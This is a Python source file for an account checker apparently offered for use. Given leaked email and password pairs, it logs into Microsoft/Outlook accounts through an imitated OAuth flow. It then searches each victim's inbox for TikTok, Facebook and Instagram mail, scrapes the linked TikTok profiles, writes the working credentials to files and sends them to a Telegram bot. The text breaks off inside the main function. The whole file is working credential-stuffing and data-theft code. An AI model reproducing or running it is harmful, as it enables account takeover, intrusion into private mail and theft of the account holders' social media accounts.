
import requests
import json
import os
import sys
import time
import threading
import re
import uuid
import urllib.parse
import random
import secrets
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

# ═══════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════

MY_SIGNATURE = "@pypkg"
TELEGRAM_CHANNEL = "https://t.me/+00Uzen6uu10zYTZk"

# Telegram Configuration
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

# Global Stats
print_lock = threading.Lock()
hits = 0
bads = 0
secured = 0
retries = 0
checked = 0
total = 0
current_email = ""
start_time = time.time()
tiktok_found = 0

# Followers Ranges
followers_ranges = {
    '0-999': 0, '1k-1.9k': 0, '2k-2.9k': 0, '3k-3.9k': 0, '4k-4.9k': 0,
    '5k-5.9k': 0, '6k-6.9k': 0, '7k-7.9k': 0, '8k-8.9k': 0, '9k-9.9k': 0,
    '10k-99k': 0, '100k-199k': 0, '200k-299k': 0, '300k-399k': 0, '400k-499k': 0,
    '500k-599k': 0, '600k-699k': 0, '700k-799k': 0, '800k-899k': 0, '900k-999k': 0,
    '1m+': 0
}

# Linked Services
linked_services_count = {
    "TikTok": 0,
    "Facebook": 0,
    "Instagram": 0
}

# User Agents
USER_AGENTS_TIKTOK = [
    'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

# ═══════════════════════════════════════════════════════════════════
# BANNER & DISPLAY
# ═══════════════════════════════════════════════════════════════════

def print_banner():
    """Print ASCII banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Fore.LIGHTYELLOW_EX}▀█▀ █ █▄▀ ▀█▀ █▀█ █▄▀   █░█ █░░ ▀█▀ █ █▀▄▀█ ▄▀█ ▀█▀ █▀▀
{Fore.LIGHTYELLOW_EX}░█░ █ █░█ ░█░ █▄█ █░█   █▄█ █▄▄ ░█░ █ █░▀░█ █▀█ ░█░ ██▄
{Fore.WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Fore.YELLOW}        DEVELOPED BY : {Fore.MAGENTA}{MY_SIGNATURE}
{Fore.YELLOW}        TOOL         : {Fore.RED}TIKTOK ULTIMATE CHECKER
{Fore.WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Fore.GREEN}        MERGED v7.0 - TELEGRAM BOT ENABLED
{Fore.WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    print(banner)

def update_display():
    """Update live display"""
    global hits, bads, secured, retries, checked, total, current_email, tiktok_found
    
    with print_lock:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_banner()
        
        progress = (checked / total * 100) if total > 0 else 0
        elapsed = time.time() - start_time
        cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
        
        print(f"{Fore.WHITE}┌{'─' * 58}┐")
        print(f"{Fore.WHITE}│ {Fore.YELLOW}⚡ Status: Checking...{' ' * 35}{Fore.WHITE}│")
        print(f"{Fore.WHITE}├{'─' * 58}┤")
        print(f"{Fore.WHITE}│ {Fore.GREEN}✓ Hits      {Fore.WHITE}│ {Fore.GREEN}{hits:<43}{Fore.WHITE}│")
        print(f"{Fore.WHITE}│ {Fore.RED}✗ Bad       {Fore.WHITE}│ {Fore.RED}{bads:<43}{Fore.WHITE}│")
        print(f"{Fore.WHITE}│ {Fore.YELLOW}🔒 Secured {Fore.WHITE}│  {Fore.YELLOW}{secured:<43}{Fore.WHITE}│")
        print(f"{Fore.WHITE}│ {Fore.CYAN}⟳ Retries   {Fore.WHITE}│ {Fore.CYAN}{retries:<43}{Fore.WHITE}│")
        print(f"{Fore.WHITE}├{'─' * 58}┤")
        print(f"{Fore.WHITE}│ {Fore.MAGENTA}🎵 TikTok Found: {tiktok_found:<38}{Fore.WHITE}  │")
        print(f"{Fore.WHITE}├{'─' * 58}┤")
        
        progress_text = f"{progress:.1f}% ({checked}/{total})"
        print(f"{Fore.WHITE}│{Fore.CYAN}Progress: {progress_text:<45}{Fore.WHITE}   │")
        print(f"{Fore.WHITE}│{Fore.BLUE}Speed: {cpm} CPM{' ' * (47 - len(str(cpm)))}{Fore.WHITE}│")
        print(f"{Fore.WHITE}├{'─' * 58}┤")
        
        # Followers Ranges
        print(f"{Fore.WHITE}│ {Fore.YELLOW}📊 Followers Ranges:{' ' * 37}{Fore.WHITE}│")
        print(f"{Fore.WHITE}├{'─' * 58}┤")
        for range_name, count in list(followers_ranges.items())[:10]:
            print(f"{Fore.WHITE}│ {Fore.CYAN}{range_name:<12}{Fore.WHITE}: {count:<43}{Fore.WHITE}│")
        print(f"{Fore.WHITE}├{'─' * 58}┤")
        
        # Linked Services
        print(f"{Fore.WHITE}│ {Fore.YELLOW}🔗 Linked Services:{' ' * 38}{Fore.WHITE}│")
        print(f"{Fore.WHITE}├{'─' * 58}┤")
        for service, count in linked_services_count.items():
            print(f"{Fore.WHITE}│ {Fore.GREEN}{service:<12}{Fore.WHITE}: {count:<43}{Fore.WHITE}│")
        print(f"{Fore.WHITE}├{'─' * 58}┤")
        
        # Current checking
        email_display = current_email[:54] if len(current_email) > 54 else current_email
        padding = 56 - len(email_display)
        print(f"{Fore.WHITE}│ {Fore.CYAN}{email_display}{' ' * padding}{Fore.WHITE} │")
        print(f"{Fore.WHITE}└{'─' * 58}┘")

def print_summary():
    """Print final summary"""
    print(f"\n{Fore.WHITE}{'═' * 60}")
    print(f"{Fore.GREEN}✅ CHECKING COMPLETED!")
    print(f"{Fore.WHITE}{'═' * 60}")
    print(f"{Fore.CYAN}Total Checked : {checked}")
    print(f"{Fore.GREEN}Hits Found    : {hits}")
    print(f"{Fore.MAGENTA}TikTok Found  : {tiktok_found}")
    print(f"{Fore.RED}Bad Accounts  : {bads}")
    print(f"{Fore.YELLOW}Secured (2FA) : {secured}")
    print(f"{Fore.WHITE}{'═' * 60}\n")

# ═══════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

def format_number(num):
    """Format number with K/M suffix"""
    if num >= 1000000:
        return f"{num/1000000:.1f}M"
    elif num >= 1000:
        return f"{num/1000:.1f}K"
    return str(num)

def get_flag(country_code):
    """Get country flag emoji"""
    try:
        if not country_code or country_code == "Unknown":
            return "🏳️"
        country_code = country_code.upper()
        return chr(ord(country_code[0]) + 127397) + chr(ord(country_code[1]) + 127397)
    except:
        return "🏳️"

def update_followers_range(followers):
    """Update followers range stats"""
    try:
        f = int(followers)
        if f >= 1000000: followers_ranges['1m+'] += 1
        elif f >= 900000: followers_ranges['900k-999k'] += 1
        elif f >= 800000: followers_ranges['800k-899k'] += 1
        elif f >= 700000: followers_ranges['700k-799k'] += 1
        elif f >= 600000: followers_ranges['600k-699k'] += 1
        elif f >= 500000: followers_ranges['500k-599k'] += 1
        elif f >= 400000: followers_ranges['400k-499k'] += 1
        elif f >= 300000: followers_ranges['300k-399k'] += 1
        elif f >= 200000: followers_ranges['200k-299k'] += 1
        elif f >= 100000: followers_ranges['100k-199k'] += 1
        elif f >= 10000: followers_ranges['10k-99k'] += 1
        elif f >= 9000: followers_ranges['9k-9.9k'] += 1
        elif f >= 8000: followers_ranges['8k-8.9k'] += 1
        elif f >= 7000: followers_ranges['7k-7.9k'] += 1
        elif f >= 6000: followers_ranges['6k-6.9k'] += 1
        elif f >= 5000: followers_ranges['5k-5.9k'] += 1
        elif f >= 4000: followers_ranges['4k-4.9k'] += 1
        elif f >= 3000: followers_ranges['3k-3.9k'] += 1
        elif f >= 2000: followers_ranges['2k-2.9k'] += 1
        elif f >= 1000: followers_ranges['1k-1.9k'] += 1
        else: followers_ranges['0-999'] += 1
    except:
        pass

def calculate_account_age(create_time):
    """Calculate account age"""
    try:
        create_date = datetime.strptime(create_time, '%Y-%m-%d')
        age = datetime.now() - create_date
        years = age.days // 365
        months = (age.days % 365) // 30
        days = (age.days % 365) % 30
        
        parts = []
        if years > 0:
            parts.append(f"{years} year{'s' if years > 1 else ''}")
        if months > 0:
            parts.append(f"{months} month{'s' if months > 1 else ''}")
        if days > 0 or not parts:
            parts.append(f"{days} day{'s' if days > 1 else ''}")
        
        return " and ".join(parts)
    except:
        return "Unknown"

def xor_encode(string):
    """XOR encode for TikTok API"""
    return "".join([hex(ord(c) ^ 5)[2:] for c in string])

# ═══════════════════════════════════════════════════════════════════
# MICROSOFT CHECKER
# ═══════════════════════════════════════════════════════════════════

class MicrosoftChecker:
    @staticmethod
    def check_account(email, password):
        """Check Microsoft/Hotmail account"""
        try:
            session = requests.Session()
            
            # Step 1: Check email provider
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)",
            }
            
            r1 = session.get(url1, headers=headers1, timeout=15)
            
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "reason": "Not a Microsoft account"}
            
            # Step 2: Get authorization page
            params = {
                "client_info": "1",
                "haschrome": "1",
                "login_hint": email,
                "mkt": "en",
                "response_type": "code",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
            }
            
            url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
            r2 = session.get(url_auth, timeout=15)
            
            # Step 3: Extract PPFT and post URL
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return {"status": "BAD", "reason": "Cannot extract login tokens"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Step 4: Submit login
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&i19=9960"
            
            r3 = session.post(post_url, data=login_data, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            }, allow_redirects=False, timeout=15)
            
            # Check for errors
            if "password is incorrect" in r3.text.lower() or "error" in r3.text.lower():
                return {"status": "BAD", "reason": "Wrong password"}
            
            # Check for 2FA
            if "proofup" in r3.text.lower() or "enforce" in r3.text.lower():
                return {"status": "SECURED", "reason": "2FA enabled"}
            
            # Step 5: Get authorization code
            location = r3.headers.get("Location", "")
            if not location or "code=" not in location:
                return {"status": "BAD", "reason": "No authorization code"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "reason": "Cannot extract code"}
            
            code = code_match.group(1)
            
            # Step 6: Exchange code for token
            token_data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                            data=token_data, timeout=15)
            
            if "access_token" not in r4.text:
                return {"status": "BAD", "reason": "Cannot get access token"}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            # Extract CID
            mspcid = None
            for cookie in session.cookies:
                if cookie.name == "MSPCID":
                    mspcid = cookie.value.upper()
                    break
            
            if not mspcid:
                mspcid = str(uuid.uuid4()).upper()
            
            return {
                "status": "HIT",
                "token": access_token,
                "cid": mspcid
            }
            
        except requests.exceptions.Timeout:
            return {"status": "RETRY", "reason": "Timeout"}
        except Exception as e:
            return {"status": "RETRY", "reason": str(e)}

# ═══════════════════════════════════════════════════════════════════
# TIKTOK CAPTURER
# ═══════════════════════════════════════════════════════════════════

class TikTokCapturer:
    @staticmethod
    def search_tiktok_emails(token, cid):
        """Search for TikTok emails in inbox"""
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Message",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": "tiktok"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            r = requests.post(search_url, json=payload, headers=headers, timeout=20)
            
            if r.status_code != 200:
                return None
            
            search_text = r.text
            
            # Count TikTok senders
            tiktok_senders = [
                "no-reply@shop.tiktok.com",
                "notification@service.tiktok.com",
                "noreply@account.tiktok.com",
                "register@account.tiktok.com",
                "no-reply@tiktok.com",
            ]
            
            tiktok_count = sum(search_text.count(sender) for sender in tiktok_senders)
            
            if tiktok_count == 0:
                return None
            
            # Extract username
            username_patterns = [
                r'(?i)this\s+email\s+was\s+generated\s+for\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'(?i)Hi\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'(?i)Hello\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'@([a-zA-Z0-9_\.]{2,30})',
            ]
            
            username = None
            for pattern in username_patterns:
                match = re.search(pattern, search_text)
                if match:
                    potential_username = match.group(1)
                    if not any(x in potential_username.lower() for x in ['tiktok', 'mail', 'email', 'hotmail', 'outlook']):
                        username = potential_username
                        break
            
            return {
                "tiktok_emails": tiktok_count,
                "username": username
            }
            
        except:
            return None
    
    @staticmethod
    def get_tiktok_profile_api(email):
        """Get TikTok profile using API"""
        try:
            secret = secrets.token_hex(16)
            xor_email = xor_encode(email)
            
            params = {
                "request_tag_from": "h5",
                "fixed_mix_mode": "1",
                "mix_mode": "1",
                "account_param": xor_email,
                "scene": "1",
                "device_platform": "android",
                "aid": "1233",
                "app_name": "musical_ly",
                "version_code": "370805",
                "ts": str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
                "iid": str(random.randint(1, 10**19)),
                "device_id": str(random.randint(1, 10**19)),
            }
            
            cookies = {
                "passport_csrf_token": secret,
                "passport_csrf_token_default": secret,
                "install_id": params["iid"]
            }
            
            headers = {
                'user-agent': random.choice(USER_AGENTS_TIKTOK),
                'x-ss-req-ticket': str(int(time.time() * 1000)),
                'passport-sdk-version': '19',
            }
            
            url = "https://api16-normal-c-useast1a.tiktokv.com/passport/account/info/v2/"
            
            response = requests.get(url, params=params, cookies=cookies, headers=headers, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get('data') and data['data'].get('username'):
                    user_info = data['data']
                    
                    return {
                        'username': user_info.get('username', ''),
                        'name': user_info.get('screen_name', ''),
                        'id': user_info.get('user_id', ''),
                        'secuid': user_info.get('sec_user_id', ''),
                        'country': user_info.get('region', 'Unknown'),
                        'bio': user_info.get('bio_description', ''),
                        'private': user_info.get('secret', False),
                        'followers': user_info.get('follower_count', 0),
                        'following': user_info.get('following_count', 0),
                        'friends': user_info.get('mplatform_followers_count', 0),
                        'likes': user_info.get('total_favorited', 0),
                        'videos': user_info.get('aweme_count', 0),
                        'verified': user_info.get('verified', False),
                        'avatar_url': user_info.get('avatar_larger', {}).get('url_list', [''])[0],
                        'create_time': user_info.get('create_time', 0)
                    }
            
            return None
        except:
            return None
    
    @staticmethod
    def get_tiktok_profile_web(username):
        """Get TikTok profile from web scraping"""
        try:
            headers = {
                'user-agent': random.choice(USER_AGENTS_TIKTOK),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            
            url = f"https://www.tiktok.com/@{username}"
            response = requests.get(url, headers=headers, timeout=15, verify=False)
            
            if response.status_code == 200:
                html = response.text
                
                profile_data = {
                    'username': username,
                    'followers': 0,
                    'following': 0,
                    'likes': 0,
                    'videos': 0,
                    'verified': False
                }
                
                # Try JSON extraction
                json_pattern = r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__" type="application/json">(.*?)</script>'
                json_match = re.search(json_pattern, html, re.DOTALL)
                
                if json_match:
                    try:
                        data = json.loads(json_match.group(1))
                        user_detail = data.get('__DEFAULT_SCOPE__', {}).get('webapp.user-detail', {}).get('userInfo', {})
                        user = user_detail.get('user', {})
                        stats_data = user_detail.get('stats', {})
                        
                        profile_data['followers'] = stats_data.get('followerCount', 0)
                        profile_data['following'] = stats_data.get('followingCount', 0)
                        profile_data['likes'] = stats_data.get('heartCount', 0)
                        profile_data['videos'] = stats_data.get('videoCount', 0)
                        profile_data['verified'] = user.get('verified', False)
                        profile_data['name'] = user.get('nickname', '')
                        profile_data['bio'] = user.get('signature', '')
                        profile_data['avatar_url'] = user.get('avatarLarger', '')
                    except:
                        pass
                
                # Regex fallback
                if profile_data['followers'] == 0:
                    patterns = [
                        (r'"followerCount":(\d+)', 'followers'),
                        (r'"followingCount":(\d+)', 'following'),
                        (r'"videoCount":(\d+)', 'videos'),
                        (r'"heartCount":(\d+)', 'likes'),
                    ]
                    
                    for pattern, key in patterns:
                        match = re.search(pattern, html)
                        if match:
                            profile_data[key] = int(match.group(1))
                
                if not profile_data.get('verified'):
                    verified_match = re.search(r'"verified":(true|false)', html)
                    if verified_match:
                        profile_data['verified'] = verified_match.group(1) == 'true'
                
                return profile_data
            
            return None
            
        except:
            return None

# ═══════════════════════════════════════════════════════════════════
# PROFILE & SERVICES CHECKER
# ═══════════════════════════════════════════════════════════════════

SERVICES = {
    "TikTok": "register@account.tiktok.com",
    "Facebook": "security@facebookmail.com",
    "Instagram": "security@mail.instagram.com",
}

def get_profile_info(token, cid):
    """Get Microsoft profile info"""
    try:
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
        }
        
        response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", 
                              headers=headers, timeout=20).json()
        
        name = response.get('names', [{}])[0].get('displayName', 'Unknown')
        country = response.get('accounts', [{}])[0].get('location', 'Unknown')
        
        return {
            'name': name,
            'country': country,
            'flag': get_flag(country)
        }
    except:
        return {
            'name': 'Unknown',
            'country': 'unknown',
            'flag': '🏳️'
        }

def check_linked_services(email, token, cid):
    """Check for linked services in inbox"""
    try:
        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        headers = {
            "authorization": f"Bearer {token}",
            "x-owa-sessionid": f"{cid}",
            "user-agent": "Mozilla/5.0"
        }
        
        inbox_response = requests.post(url, headers=headers, data="", timeout=20).text
        
        linked = []
        for service_name, sender in SERVICES.items():
            if sender in inbox_response:
                count = inbox_response.count(sender)
                linked.append(f"{service_name} ({count})")
                
                with print_lock:
                    linked_services_count[service_name] += 1
        
        return linked
    except:
        return []

# ═══════════════════════════════════════════════════════════════════
# TELEGRAM BOT
# ═══════════════════════════════════════════════════════════════════

def send_to_telegram(hit_data):
    """Send hit to Telegram with image and full details"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    
    try:
        # Prepare message
        message = f"""🎯 <b>New Hits Found</b>

<b>Full name:</b> {hit_data.get('full_name', '🔒')}
<b>Username:</b> {hit_data.get('username', 'Unknown')}
<b>Email:</b> {hit_data['email']}
<b>Password:</b> {hit_data['password']}
<b>Bio:</b> {hit_data.get('bio', "It's only real for you, that's the thing about it")}
<b>ID:</b> {hit_data.get('id', 'Unknown')}
<b>Followers:</b> {hit_data.get('followers', 0)}
<b>Following:</b> {hit_data.get('following', 0)}
<b>Friends:</b> {hit_data.get('friends', 0)}
<b>Likes:</b> {hit_data.get('likes', 0)}
<b>Videos:</b> {hit_data.get('videos', 0)}
<b>Date:</b> {hit_data.get('create_date', 'Unknown')}
<b>Account age:</b> {hit_data.get('account_age', 'Unknown')}
<b>language:</b> {hit_data.get('language', 'en')}
<b>country:</b> {hit_data.get('country', 'unknown')}
<b>private:</b> {hit_data.get('private', 'No')}
<b>verified:</b> {hit_data.get('verified', 'No')}

<b>Created by:</b> {MY_SIGNATURE}"""
        
        # Send with photo
        avatar_url = hit_data.get('avatar_url', '')
        
        if avatar_url:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'photo': avatar_url,
                'caption': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=data, timeout=30)
            return response.status_code == 200
        else:
            # Send as message if no photo
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=data, timeout=30)
            return response.status_code == 200
            
    except Exception as e:
        return False

# ═══════════════════════════════════════════════════════════════════
# FILE SAVER
# ═══════════════════════════════════════════════════════════════════

def save_hit(email, password, tiktok_data):
    """Save hit to file"""
    username = tiktok_data.get('username', 'Unknown')
    followers = tiktok_data.get('followers', 0)
    
    # Determine file based on followers
    if followers >= 1000000: filename = 'Results/TikTok_Hits/1M+_hits.txt'
    elif followers >= 900000: filename = 'Results/TikTok_Hits/900k-999k_hits.txt'
    elif followers >= 800000: filename = 'Results/TikTok_Hits/800k-899k_hits.txt'
    elif followers >= 700000: filename = 'Results/TikTok_Hits/700k-799k_hits.txt'
    elif followers >= 600000: filename = 'Results/TikTok_Hits/600k-699k_hits.txt'
    elif followers >= 500000: filename = 'Results/TikTok_Hits/500k-599k_hits.txt'
    elif followers >= 400000: filename = 'Results/TikTok_Hits/400k-499k_hits.txt'
    elif followers >= 300000: filename = 'Results/TikTok_Hits/300k-399k_hits.txt'
    elif followers >= 200000: filename = 'Results/TikTok_Hits/200k-299k_hits.txt'
    elif followers >= 100000: filename = 'Results/TikTok_Hits/100k-199k_hits.txt'
    elif followers >= 10000: filename = 'Results/TikTok_Hits/10k-99k_hits.txt'
    elif followers >= 9000: filename = 'Results/TikTok_Hits/9k-9.9k_hits.txt'
    elif followers >= 8000: filename = 'Results/TikTok_Hits/8k-8.9k_hits.txt'
    elif followers >= 7000: filename = 'Results/TikTok_Hits/7k-7.9k_hits.txt'
    elif followers >= 6000: filename = 'Results/TikTok_Hits/6k-6.9k_hits.txt'
    elif followers >= 5000: filename = 'Results/TikTok_Hits/5k-5.9k_hits.txt'
    elif followers >= 4000: filename = 'Results/TikTok_Hits/4k-4.9k_hits.txt'
    elif followers >= 3000: filename = 'Results/TikTok_Hits/3k-3.9k_hits.txt'
    elif followers >= 2000: filename = 'Results/TikTok_Hits/2k-2.9k_hits.txt'
    elif followers >= 1000: filename = 'Results/TikTok_Hits/1k-1.9k_hits.txt'
    elif followers > 0: filename = 'Results/TikTok_Hits/0-999_hits.txt'
    else: filename = 'Results/TikTok_Hits/username_only.txt'
    
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    
    # Add header if new file
    if not os.path.exists(filename):
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"# Created by {MY_SIGNATURE} - {TELEGRAM_CHANNEL}\n\n")
    
    # Write hit
    content = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Hit Found
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📧 Email         : {email}
🔑 Password      : {password}

🎵 TikTok Information:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Username      : @{tiktok_data.get('username', 'Unknown')}
📛 Name          : {tiktok_data.get('name', 'Unknown')}
👥 Followers     : {format_number(followers)} ({followers:,})
➕ Following     : {format_number(tiktok_data.get('following', 0))} ({tiktok_data.get('following', 0):,})
👫 Friends       : {tiktok_data.get('friends', 0)}
📹 Videos        : {tiktok_data.get('videos', 0):,}
❤️  Likes         : {format_number(tiktok_data.get('likes', 0))} ({tiktok_data.get('likes', 0):,})
✅ Verified      : {'Yes' if tiktok_data.get('verified') else 'No'}
🔒 Private       : {'Yes' if tiktok_data.get('private') else 'No'}
🆔 ID            : {tiktok_data.get('id', 'Unknown')}
📝 Bio           : {tiktok_data.get('bio', 'N/A')}
🌍 Country       : {tiktok_data.get('country', 'Unknown')} {tiktok_data.get('flag', '')}
📅 Created       : {tiktok_data.get('create_date', 'Unknown')}
⏳ Account Age   : {tiktok_data.get('account_age', 'Unknown')}
📧 TikTok Emails : {tiktok_data.get('tiktok_emails', 0)}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 Captured by: {MY_SIGNATURE}
🔗 Channel: {TELEGRAM_CHANNEL}
⏰ Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
    
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(content)

# ═══════════════════════════════════════════════════════════════════
# MAIN CHECKER
# ═══════════════════════════════════════════════════════════════════

def check_combo(email, password):
    """Main checking function"""
    global hits, bads, secured, retries, checked, current_email, tiktok_found
    
    current_email = email
    
    # Step 1: Check Microsoft account
    ms_result = MicrosoftChecker.check_account(email, password)
    
    if ms_result['status'] == 'RETRY':
        with print_lock:
            retries += 1
            checked += 1
        update_display()
        return
    
    if ms_result['status'] == 'BAD':
        with print_lock:
            bads += 1
            checked += 1
        update_display()
        return
    
    if ms_result['status'] == 'SECURED':
        with print_lock:
            secured += 1
            checked += 1
        update_display()
        return
    
    # Step 2: HIT - Check for TikTok
    token = ms_result['token']
    cid = ms_result['cid']
    
    # Search TikTok emails
    tiktok_result = TikTokCapturer.search_tiktok_emails(token, cid)
    
    if not tiktok_result:
        with print_lock:
            hits += 1
            checked += 1
        update_display()
        return
    
    # TikTok found!
    username = tiktok_result.get('username')
    tiktok_emails_count = tiktok_result.get('tiktok_emails', 0)
    
    # Get profile info
    profile_info = get_profile_info(token, cid)
    
    # Get linked services
    linked = check_linked_services(email, token, cid)
    
    # Get TikTok profile details
    tiktok_profile = None
    
    # Try API first
    tiktok_profile = TikTokCapturer.get_tiktok_profile_api(email)
    
    # If API fails, try web scraping
    if not tiktok_profile and username:
        tiktok_profile = TikTokCapturer.get_tiktok_profile_web(username)
    
    # Merge data
    final_data = {
        'email': email,
        'password': password,
        'full_name': profile_info.get('name', '🔒'),
        'username': username or (tiktok_profile.get('username') if tiktok_profile else 'Unknown'),
        'name': tiktok_profile.get('name', 'Unknown') if tiktok_profile else 'Unknown',
        'bio': tiktok_profile.get('bio', "It's only real for you, that's the thing about it") if tiktok_profile else '',
        'id': tiktok_profile.get('id', '') if tiktok_profile else '',
        'followers': tiktok_profile.get('followers', 0) if tiktok_profile else 0,
        'following': tiktok_profile.get('following', 0) if tiktok_profile else 0,
        'friends': tiktok_profile.get('friends', 0) if tiktok_profile else 0,
        'likes': tiktok_profile.get('likes', 0) if tiktok_profile else 0,
        'videos': tiktok_profile.get('videos', 0) if tiktok_profile else 0,
        'verified': 'Yes' if (tiktok_profile.get('verified') if tiktok_profile else False) else 'No',
        'private': 'Yes' if (tiktok_profile.get('private') if tiktok_profile else False) else 'No',
        'country': tiktok_profile.get('country', profile_info.get('country', 'unknown')) if tiktok_profile else profile_info.get('country', 'unknown'),
        'flag': get_flag(tiktok_profile.get('country', profile_info.get('country', 'unknown')) if tiktok_profile else profile_info.get('country', 'unknown')),
        'language': 'en',
        'tiktok_emails': tiktok_emails_count,
        'avatar_url': tiktok_profile.get('avatar_url', '') if tiktok_profile else '',
        'create_time': tiktok_profile.get('create_time', 0) if tiktok_profile else 0,
    }
    
    # Calculate create date and age
    if final_data['create_time']:
        try:
            create_date = datetime.fromtimestamp(final_data['create_time'])
            final_data['create_date'] = create_date.strftime('%d-%m-%Y')
            final_data['account_age'] = calculate_account_age(create_date.strftime('%Y-%m-%d'))
        except:
            final_data['create_date'] = 'Unknown'
            final_data['account_age'] = 'Unknown'
    else:
        final_data['create_date'] = 'Unknown'
        final_data['account_age'] = 'Unknown'
    
    # Update stats
    with print_lock:
        hits += 1
        tiktok_found += 1
        checked += 1
        update_followers_range(final_data['followers'])
    
    # Save to file
    save_hit(email, password, final_data)
    
    # Send to Telegram
    send_to_telegram(final_data)
    
    update_display()

# ═══════════════════════════════════════════════════════════════════
# MAIN PROGRAM
# ═══════════════════════════════════════════════════════════════════

def main():
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, total
    
    print_banner()
    
    # Telegram configuration
    print(f"\n{Fore.WHITE}┌{'─' * 58}┐")
    print(f"{Fore.WHITE}│ {Fore.CYAN}⚡ TELEGRAM BOT CONFIGURATION{' ' * 28}{Fore.WHITE}│")
    print(f"{Fore.WHITE}└{'─' * 58}┘\n")
    
